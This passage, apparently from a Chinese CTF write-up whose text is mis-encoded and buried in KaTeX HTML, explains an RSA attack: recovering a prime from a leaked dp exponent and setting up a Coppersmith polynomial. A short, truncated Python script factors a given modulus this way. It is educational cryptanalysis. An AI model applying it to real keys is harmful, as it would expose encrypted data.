class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ã€‚</p><p>æ‰€ä»¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>âˆ—</mo><msub><mi>d</mi><mi>p</mi></msub><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*d_p=1\mod{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œå³å­˜åœ¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ä½¿å¾—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>âˆ—</mo><msub><mi>d</mi><mi>p</mi></msub><mo>âˆ’</mo><mn>1</mn><mo>=</mo><mi>k</mi><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_p-1=k*(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œæ³¨æ„åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>p</mi></msub><mo>&lt;</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d_p&lt;p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œé‚£ä¹ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>&lt;</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">k&lt;e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>ã€‚</p><p>é‚£ä¹ˆé€šè¿‡æšä¸¾<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>å¯ä»¥å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>1</mn><mo>+</mo><mo stretchy="false">(</mo><mi>e</mi><mo>âˆ—</mo><msub><mi>d</mi><mi>p</mi></msub><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">p=1+(e*d_p-1)//k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">//</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ã€‚</p><p>ç¬¬äºŒæ­¥ï¼šæœ‰<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><mi>p</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mi>q</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c_1=m^p\mod{n},c_2=m^q\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>æ ¹æ®åŒä½™ä»¥åŠè´¹é©¬å°å®šç†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>a</mi><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(a^{p-1}=1\mod{p})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>ï¼Œæœ‰ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><mi>m</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c_1=m\mod{p},c_2=m\mod{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ã€‚</p><p>æ„é€ å¤šé¡¹å¼ï¼šæœ‰<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mo>âˆ’</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><mo>+</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>âˆ—</mo><mi>m</mi><mo>+</mo><msub><mi>c</mi><mn>1</mn></msub><mo>âˆ—</mo><msub><mi>c</mi><mn>2</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">f(m)=m^2-(c_1+c_2)*m+c_1*c_2\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6153em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>ç¬¬ä¸‰æ­¥ï¼šcoppersmithæ”»å‡»å¯ä»¥å¸®åŠ©æ±‚è§£<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>y</mi><mn>0</mn></msub><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">f(x_0)=y_0\mod{N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>,å…¶ä¸­<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub><mo>&lt;</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">x_0&lt;X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>æ˜¯ä¸€ä¸ªä¸Šç•Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">n =  <span class="hljs-number">114101396033690088275999670914803472451228154227614098210572767821433470213124900655723605426526569384342101959232900145334500170690603208327913698128445002527020347955300595384752458477749198178791196660625870659540794807018881780680683388008090434114437818447523471527878292741702348454486217652394664664641</span><br>N =  <span class="hljs-number">1159977299277711167607914893426674454199208605107323826176606074354449015203832606569051328721360397610665453513201486235549374869954501563523028914285006850687275382822302821825953121223999268058107278346499657597050468069712686559045712946025472616754027552629008516489090871415609098178522863027127254404804829735621706042266140637592206366042515190385496909533329383212542170504864473944657824502882014292528444918055958758310544435120502872883857209880723535754528096143707324179005292445100655695427777453144657819474805882956064292780031599790769618615908501966912635232746588639924772530057835864082951499028</span><br>dP =  <span class="hljs-number">33967356791272818610254738927769774016289590226681637441101504040121743937150259930712897925893431093938385216227201268238374281750681609796883676743311872905933219290266120756315613501614208779063819499785817502677885240656957036398336462000771885589364702443157120609506628895933862241269347200444629283263</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>e=<span class="hljs-number">65537</span><br><span class="hljs-comment">#å·²çŸ¥e,dp,nåˆ†è§£n</span><br><span class="hljs-comment">#dp =d mod p-1</span><br><span class="hljs-comment">#e*dp =1 +k*(p-1)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> (e*dP-<span class="hljs-number">1</span>)%i==<span class="hljs-number">0</span>:<br>        P=<span class="hljs-number">1</span>+ (e*dP-<span class="hljs-number">1</span>)//i<br>        <span class="hljs-keyword">if</span> N%P==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(P)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span 